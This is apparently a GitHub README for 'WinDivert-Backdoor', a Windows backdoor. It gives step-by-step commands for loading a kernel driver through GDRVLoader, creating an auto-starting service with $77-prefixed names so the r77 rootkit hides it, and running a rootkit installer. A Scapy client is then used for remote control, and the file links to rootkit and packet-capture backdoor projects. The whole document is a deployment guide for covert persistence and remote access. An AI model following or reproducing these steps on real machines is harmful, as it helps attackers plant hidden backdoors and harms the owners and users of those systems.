# WinDivert-Backdoor
## Server
1. Install driver with GDRVLoader.exe </br>
`GDRVLoader.exe C:\$77folder\$77kernel.sys` 
3. Install service </br>
`sc create $77service binPath= "C:\$77folder\$77service.exe" start= auto`
5. Start service </br>
`sc start $77service`
6. Install rootkit </br>
`Install.exe`
## Client
1. [Install Scapy](https://scapy.readthedocs.io/en/latest/installation.html)
2. Download client.py script
3. Flourish

## References
https://github.com/zer0condition/GDRVLoader
https://github.com/zer0condition/GDRVLoader
https://github.com/basil00/Divert
https://github.com/cocomelonc/2022-05-09-malware-pers-4/tree/master
https://github.com/r-a303931/pcap-backdoor
https://github.com/bytecode77/r77-rootkit
